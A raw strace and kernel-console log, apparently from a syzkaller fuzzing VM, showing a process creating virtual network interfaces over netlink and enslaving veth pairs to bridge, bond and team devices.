[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] close(3)                    = 0
[pid  5086] socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE) = 3
[pid  5086] sendto(3, [{nlmsg_len=68, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x03\x00\x69\x70\x36\x67\x72\x65\x74\x61\x70\x30\x00\x00\x14\x00\x12\x00\x0d\x00\x01\x00\x69\x70\x36\x67\x72\x65\x74\x61\x70\x00\x00\x00"], 68, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 68
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=68, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x03\x00\x62\x72\x69\x64\x67\x65\x30\x00\x10\x00\x12\x00\x0a\x00\x01\x00\x62\x72\x69\x64\x67\x65\x00\x00"], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=56, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x03\x00\x76\x63\x61\x6e\x30\x00\x00\x00\x0c\x00\x12\x00\x08\x00\x01\x00\x76\x63\x61\x6e"], 56, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 56
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=56, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=56, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x03\x00\x62\x6f\x6e\x64\x30\x00\x00\x00\x0c\x00\x12\x00\x08\x00\x01\x00\x62\x6f\x6e\x64"], 56, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 56
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=56, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=56, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x03\x00\x74\x65\x61\x6d\x30\x00\x00\x00\x0c\x00\x12\x00\x08\x00\x01\x00\x74\x65\x61\x6d"], 56, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 56
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=56, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x00\x03\x00\x64\x75\x6d\x6d\x79\x30\x00\x00\x10\x00\x12\x00\x09\x00\x01\x00\x64\x75\x6d\x6d\x79\x00\x00\x00"], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x00\x03\x00\x6e\x6c\x6d\x6f\x6e\x30\x00\x00\x10\x00\x12\x00\x09\x00\x01\x00\x6e\x6c\x6d\x6f\x6e\x00\x00\x00"], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=56, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x03\x00\x63\x61\x69\x66\x30\x00\x00\x00\x0c\x00\x12\x00\x08\x00\x01\x00\x63\x61\x69\x66"], 56, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 56
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=56, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x03\x00\x62\x61\x74\x61\x64\x76\x30\x00\x10\x00\x12\x00\x0a\x00\x01\x00\x62\x61\x74\x61\x64\x76\x00\x00"], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x00\x03\x00\x76\x78\x63\x61\x6e\x31\x00\x00\x10\x00\x12\x00\x09\x00\x01\x00\x76\x78\x63\x61\x6e\x00\x00\x00"], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x03\x00\x77\x67\x30\x00\x14\x00\x12\x00\x0d\x00\x01\x00\x77\x69\x72\x65\x67\x75\x61\x72\x64\x00\x00\x00"], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x03\x00\x77\x67\x31\x00\x14\x00\x12\x00\x0d\x00\x01\x00\x77\x69\x72\x65\x67\x75\x61\x72\x64\x00\x00\x00"], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
syzkaller login: [   75.798678][ T5086] chnl_net:caif_netlink_parms(): no params data found
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x03\x00\x77\x67\x32\x00\x14\x00\x12\x00\x0d\x00\x01\x00\x77\x69\x72\x65\x67\x75\x61\x72\x64\x00\x00\x00"], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x03\x00\x62\x72\x69\x64\x67\x65\x5f\x73\x6c\x61\x76\x65\x5f\x30\x00\x00\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\x03\x00\x76\x65\x74\x68\x30\x5f\x74\x6f\x5f\x62\x72\x69\x64\x67\x65\x00"], 108, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 108
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x03\x00\x62\x72\x69\x64\x67\x65\x5f\x73\x6c\x61\x76\x65\x5f\x31\x00\x00\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\x03\x00\x76\x65\x74\x68\x31\x5f\x74\x6f\x5f\x62\x72\x69\x64\x67\x65\x00"], 108, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 108
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="bridge_slave_0", ifr_ifindex=29}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="bridge0", ifr_ifindex=13}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x1d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x0d\x00\x00\x00"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="bridge_slave_1", ifr_ifindex=31}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="bridge0", ifr_ifindex=13}) = 0
[pid  5086] close(4)                    = 0
[   75.894184][ T5086] bridge0: port 1(bridge_slave_0) entered blocking state
[   75.902350][ T5086] bridge0: port 1(bridge_slave_0) entered disabled state
[   75.911279][ T5086] bridge_slave_0: entered allmulticast mode
[   75.918222][ T5086] bridge_slave_0: entered promiscuous mode
[   75.935062][ T5086] bridge0: port 2(bridge_slave_1) entered blocking state
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x0d\x00\x00\x00"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=104, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x03\x00\x62\x6f\x6e\x64\x5f\x73\x6c\x61\x76\x65\x5f\x30\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x03\x00\x76\x65\x74\x68\x30\x5f\x74\x6f\x5f\x62\x6f\x6e\x64\x00\x00\x00"], 104, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 104
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=104, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=104, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x03\x00\x62\x6f\x6e\x64\x5f\x73\x6c\x61\x76\x65\x5f\x31\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x03\x00\x76\x65\x74\x68\x31\x5f\x74\x6f\x5f\x62\x6f\x6e\x64\x00\x00\x00"], 104, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 104
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=104, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="bond_slave_0", ifr_ifindex=33}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="bond0", ifr_ifindex=15}) = 0
[pid  5086] close(4)                    = 0
[   75.942454][ T5086] bridge0: port 2(bridge_slave_1) entered disabled state
[   75.949701][ T5086] bridge_slave_1: entered allmulticast mode
[   75.956605][ T5086] bridge_slave_1: entered promiscuous mode
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x0f\x00\x00\x00"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="bond_slave_1", ifr_ifindex=35}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="bond0", ifr_ifindex=15}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x23\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x0f\x00\x00\x00"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=104, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x03\x00\x74\x65\x61\x6d\x5f\x73\x6c\x61\x76\x65\x5f\x30\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x03\x00\x76\x65\x74\x68\x30\x5f\x74\x6f\x5f\x74\x65\x61\x6d\x00\x00\x00"], 104, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 104
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=104, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=104, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x03\x00\x74\x65\x61\x6d\x5f\x73\x6c\x61\x76\x65\x5f\x31\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x03\x00\x76\x65\x74\x68\x31\x5f\x74\x6f\x5f\x74\x65\x61\x6d\x00\x00\x00"], 104, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 104
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=104, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="team_slave_0", ifr_ifindex=37}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="team0", ifr_ifindex=16}) = 0
[pid  5086] close(4)                    = 0
[   75.995534][ T5086] bond0: (slave bond_slave_0): Enslaving as an active interface with an up link
[   76.013832][ T5086] bond0: (slave bond_slave_1): Enslaving as an active interface with an up link
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x25\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x10\x00\x00\x00"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="team_slave_1", ifr_ifindex=39}) = 0
[pid  5086] close(4)                    = 0
